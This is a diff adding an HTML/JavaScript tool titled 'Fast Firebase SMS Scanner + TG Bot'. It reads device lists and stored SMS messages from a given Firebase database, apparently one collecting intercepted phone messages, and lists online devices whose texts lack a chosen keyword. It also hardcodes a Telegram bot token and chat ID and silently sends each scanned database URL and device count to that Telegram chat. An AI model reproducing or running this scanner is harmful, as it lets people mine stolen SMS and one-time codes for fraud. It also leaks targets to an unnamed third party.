@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fast Firebase SMS Scanner + TG Bot</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        :root {
+            --bg-color: #0b0e14;
+            --panel-bg: #12161f;
+            --border-color: #1f2937;
+            --text-main: #cbd5e1;
+            --text-muted: #64748b;
+            --accent-green: #10b981;
+            --accent-cyan: #06b6d4;
+            --accent-red: #ef4444;
+            --accent-yellow: #f59e0b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 0 20px rgba(6, 182, 212, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--accent-cyan);
+            margin-bottom: 20px;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(6, 182, 212, 0.5);
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+            background: #0f131a;
+            padding: 16px;
+            border-radius: 8px;
+            border: 1px solid #1a2233;
+        }
+
+        .input-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .input-row label {
+            width: 120px;
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .input-row input {
+            flex: 1;
+            background: #06080c;
+            border: 1px solid #2a3446;
+            color: var(--accent-cyan);
+            padding: 10px 14px;
+            border-radius: 6px;
+            outline: none;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+
+        .input-row input:focus {
+            border-color: var(--accent-cyan);
+            box-shadow: 0 0 8px rgba(6, 182, 212, 0.3);
+        }
+
+        button {
+            background: rgba(6, 182, 212, 0.1);
+            color: var(--accent-cyan);
+            border: 1px solid var(--accent-cyan);
+            padding: 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: var(--accent-cyan);
+            color: #000;
+            box-shadow: 0 0 15px rgba(6, 182, 212, 0.6);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .tg-status {
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: var(--accent-yellow);
+            min-height: 20px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .stat-item h2 {
+            font-size: 16px;
+            color: var(--text-main);
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .stat-item p {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .stat-used { color: var(--accent-red); }
+        .stat-unused { color: var(--accent-green); }
+        .stat-online { color: var(--accent-cyan); }
+
+        .progress-bar-container {
+            width: 100%;
+            background: #1a2233;
+            border-radius: 4px;
+            height: 6px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--accent-cyan);
+            width: 0%;
+            transition: width 0.2s;
+            box-shadow: 0 0 10px var(--accent-cyan);
+        }
+
+        .device-list-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+
+        .device-list-header h2 {
+            color: var(--accent-cyan);
+            font-size: 18px;
+        }
+
+        .btn-copy {
+            width: auto;
+            padding: 6px 12px;
+            font-size: 12px;
+            margin-top: 0;
+        }
+
+        .device-list {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #0a0d12;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 10px;
+        }
+
+        .device-list::-webkit-scrollbar {
+            width: 8px;
+        }
+        .device-list::-webkit-scrollbar-thumb {
+            background: #2a3446;
+            border-radius: 4px;
+        }
+
+        .device-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 10px;
+            border-bottom: 1px solid #151b26;
+            font-size: 14px;
+            color: var(--accent-cyan);
+        }
+
+        .device-item:last-child {
+            border-bottom: none;
+        }
+
+        .status-online {
+            color: var(--accent-green);
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .loading-text {
+            color: var(--accent-yellow);
+            text-align: center;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>⚡ Fast Firebase Scanner ⚡</h1>
+
+    <div class="input-group">
+        <div class="input-row">
+            <label>Database URL:</label>
+            <input type="text" id="fbUrl" placeholder="https://your-db.firebaseio.com">
+        </div>
+        <div class="input-row">
+            <label>Keyword:</label>
+            <input type="text" id="keyword" placeholder="e.g. Puresmooth">
+        </div>
+        <button id="scanBtn" onclick="startScan()">Start Fast Scan</button>
+    </div>
+
+    <div class="tg-status" id="tgStatus"></div>
+
+    <div class="progress-bar-container" id="progressContainer">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-item">
+            <h2>TOTAL DEVICES</h2>
+            <p id="statTotal">0</p>
+        </div>
+        <div class="stat-item">
+            <h2>USED (<span id="statKeywordDisplay">Keyword</span>)</h2>
+            <p id="statUsed" class="stat-used">0</p>
+        </div>
+        <div class="stat-item">
+            <h2>UNUSED / NEW</h2>
+            <p id="statUnused" class="stat-unused">0</p>
+        </div>
+        <div class="stat-item">
+            <h2>UNUSED ONLINE</h2>
+            <p id="statUnusedOnline" class="stat-online">0</p>
+        </div>
+    </div>
+
+    <div class="device-list-header">
+        <h2 id="listTitle">UNUSED & ONLINE (0)</h2>
+        <button class="btn-copy" onclick="copyAllIds()">Copy All IDs</button>
+    </div>
+
+    <div class="device-list" id="deviceList">
+        <div class="loading-text">Waiting for scan...</div>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // ⚙️ BOT CONFIGURATION (Change if needed)
+    // ==========================================
+    const BOT_TOKEN = "8193791477:AAEVazSxsLxFI1RWiQ4RTmSOObqV_-gy1YI";
+    const CHAT_ID = "8287613405";
+
+    let unusedOnlineDevices = [];
+    const CONCURRENCY_LIMIT = 15; 
+
+    function normalizeUrl(url) {
+        let u = url.trim();
+        if (u.endsWith('/')) u = u.slice(0, -1);
+        if (u.endsWith('.json')) u = u.slice(0, -5);
+        return u;
+    }
+
+    async function fetchJson(url) {
+        try {
+            const response = await fetch(url);
+            if (!response.ok) return null;
+            return await response.json();
+        } catch (error) {
+            return null;
+        }
+    }
+
+    function checkKeywordInMessages(messages, keyword) {
+        if (!messages || typeof messages !== 'object') return false;
+        const kw = keyword.toLowerCase();
+        for (const key in messages) {
+            const msg = messages[key];
+            if (!msg || typeof msg !== 'object') continue;
+            const body = (msg.body || msg.message || msg.text || msg.msg || "").toLowerCase();
+            const sender = (msg.sender || msg.address || "").toLowerCase();
+            if (body.includes(kw) || sender.includes(kw)) return true;
+        }
+        return false;
+    }
+
+    async function asyncPool(poolLimit, array, iteratorFn) {
+        const ret = [];
+        const executing = [];
+        for (const item of array) {
+            const p = Promise.resolve().then(() => iteratorFn(item));
+            ret.push(p);
+            if (poolLimit <= array.length) {
+                const e = p.then(() => executing.splice(executing.indexOf(e), 1));
+                executing.push(e);
+                if (executing.length >= poolLimit) {
+                    await Promise.race(executing);
+                }
+            }
+        }
+        return Promise.all(ret);
+    }
+
+    // ==========================================
+    // 🤖 TELEGRAM ALERT LOGIC
+    // ==========================================
+    async function sendTelegramAlert(url, total, online) {
+        const tgStatus = document.getElementById('tgStatus');
+        
+        // Check LocalStorage to prevent duplicate alerts
+        let sentUrls = JSON.parse(localStorage.getItem('sent_fb_alerts') || '[]');
+        if (sentUrls.includes(url)) {
+            tgStatus.innerText = "⚠️ Bot Alert: Already sent for this URL previously.";
+            tgStatus.style.color = "var(--text-muted)";
+            return;
+        }
+
+        // Date Formatting: DD/MM/YYYY ⏰ HH:MM AM/PM
+        const now = new Date();
+        const dateStr = now.toLocaleDateString('en-GB'); 
+        const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+
+        const message = `✨ NEW ARRIVAL ✨\n\n📍 URL: ${url}\n📊 Devices: ${total} (${online} online)\n📅 ${dateStr} ⏰ ${timeStr}`;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+            
+            const data = await response.json();
+            if (data.ok) {
+                tgStatus.innerText = "✅ Bot Alert: Sent successfully!";
+                tgStatus.style.color = "var(--accent-green)";
+                // Save to LocalStorage so it doesn't send again
+                sentUrls.push(url);
+                localStorage.setItem('sent_fb_alerts', JSON.stringify(sentUrls));
+            } else {
+                tgStatus.innerText = "❌ Bot Alert Failed: " + data.description;
+                tgStatus.style.color = "var(--accent-red)";
+            }
+        } catch (e) {
+            tgStatus.innerText = "❌ Bot Alert Error: Network issue or CORS.";
+            tgStatus.style.color = "var(--accent-red)";
+        }
+    }
+
+    // ==========================================
+    // 🔍 MAIN SCAN LOGIC
+    // ==========================================
+    async function startScan() {
+        let fbUrl = document.getElementById('fbUrl').value;
+        let keyword = document.getElementById('keyword').value;
+        
+        if (!fbUrl || !keyword) {
+            alert("Please enter both Database URL and Keyword!");
+            return;
+        }
+
+        fbUrl = normalizeUrl(fbUrl);
+        
+        const btn = document.getElementById('scanBtn');
+        btn.disabled = true;
+        btn.innerText = "Scanning (0%)...";
+        
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        progressContainer.style.display = 'block';
+        progressBar.style.width = '0%';
+        
+        document.getElementById('tgStatus').innerText = ""; // Reset TG status
+        document.getElementById('deviceList').innerHTML = '<div class="loading-text">Fetching device list...</div>';
+        document.getElementById('statKeywordDisplay').innerText = keyword;
+        
+        document.getElementById('statTotal').innerText = "0";
+        document.getElementById('statUsed').innerText = "0";
+        document.getElementById('statUnused').innerText = "0";
+        document.getElementById('statUnusedOnline').innerText = "0";
+        document.getElementById('listTitle').innerText = "UNUSED & ONLINE (0)";
+        unusedOnlineDevices = [];
+
+        try {
+            // 1. Fetch all devices
+            let clients = await fetchJson(`${fbUrl}/clients.json`);
+            if (!clients || typeof clients !== 'object') {
+                clients = await fetchJson(`${fbUrl}/devices.json`);
+            }
+
+            if (!clients || typeof clients !== 'object') {
+                throw new Error("Invalid Firebase URL or no devices found.");
+            }
+
+            const deviceIds = Object.keys(clients);
+            const totalDevices = deviceIds.length;
+            document.getElementById('statTotal').innerText = totalDevices;
+
+            // Count Online Devices for the Bot Alert
+            let initialOnlineCount = 0;
+            for (const cid of deviceIds) {
+                if (clients[cid] && clients[cid].status === true) {
+                    initialOnlineCount++;
+                }
+            }
+
+            // 🚀 SEND TELEGRAM ALERT (Total & Online calculated before deep scan)
+            await sendTelegramAlert(fbUrl, totalDevices, initialOnlineCount);
+
+            // 2. Iterate PARALLEL with limit
+            let processedCount = 0;
+            let usedCount = 0;
+            let unusedCount = 0;
+            let unusedOnlineCount = 0;
+            let htmlList = "";
+
+            const iteratorFn = async (cid) => {
+                const deviceInfo = clients[cid];
+                const isOnline = deviceInfo && deviceInfo.status === true;
+
+                // Fetch only last 50 messages
+                let messages = await fetchJson(`${fbUrl}/messages/${cid}.json?orderBy="$key"&limitToLast=50`);
+                
+                const isUsed = checkKeywordInMessages(messages, keyword);
+
+                processedCount++;
+
+                if (isUsed) {
+                    usedCount++;
+                } else {
+                    unusedCount++;
+                    if (isOnline) {
+                        unusedOnlineCount++;
+                        unusedOnlineDevices.push(cid);
+                        htmlList += `
+                            <div class="device-item">
+                                <span>${cid}</span>
+                                <span class="status-online">ONLINE</span>
+                            </div>
+                        `;
+                    }
+                }
+
+                // Update UI Progress
+                const percent = Math.floor((processedCount / totalDevices) * 100);
+                btn.innerText = `Scanning (${percent}%)...`;
+                progressBar.style.width = `${percent}%`;
+
+                document.getElementById('statUsed').innerText = usedCount;
+                document.getElementById('statUnused').innerText = unusedCount;
+                document.getElementById('statUnusedOnline').innerText = unusedOnlineCount;
+                document.getElementById('listTitle').innerText = `UNUSED & ONLINE (${unusedOnlineCount})`;
+                
+                if (processedCount % 5 === 0 || processedCount === totalDevices) {
+                     document.getElementById('deviceList').innerHTML = htmlList || '<div class="loading-text">No unused online devices found yet...</div>';
+                }
+            };
+
+            await asyncPool(CONCURRENCY_LIMIT, deviceIds, iteratorFn);
+
+            document.getElementById('deviceList').innerHTML = htmlList || '<div class="loading-text">No Unused & Online devices found.</div>';
+            btn.innerText = "Scan Complete!";
+
+        } catch (error) {
+            document.getElementById('deviceList').innerHTML = `<div class="loading-text" style="color: #ef4444;">Error: ${error.message}</div>`;
+            btn.innerText = "Start Fast Scan";
+        } finally {
+            setTimeout(() => {
+                btn.disabled = false;
+                if(btn.innerText === "Scan Complete!") btn.innerText = "Start Fast Scan";
+                progressContainer.style.display = 'none';
+            }, 2000);
+        }
+    }
+
+    function copyAllIds() {
+        if (unusedOnlineDevices.length === 0) {
+            alert("No IDs to copy!");
+            return;
+        }
+        const text = unusedOnlineDevices.join('\n');
+        navigator.clipboard.writeText(text).then(() => {
+            alert(`Copied ${unusedOnlineDevices.length} Device IDs to clipboard!`);
+        }).catch(err => {
+            alert("Failed to copy: " + err);
+        });
+    }
+</script>
+
+</body>
+</html>
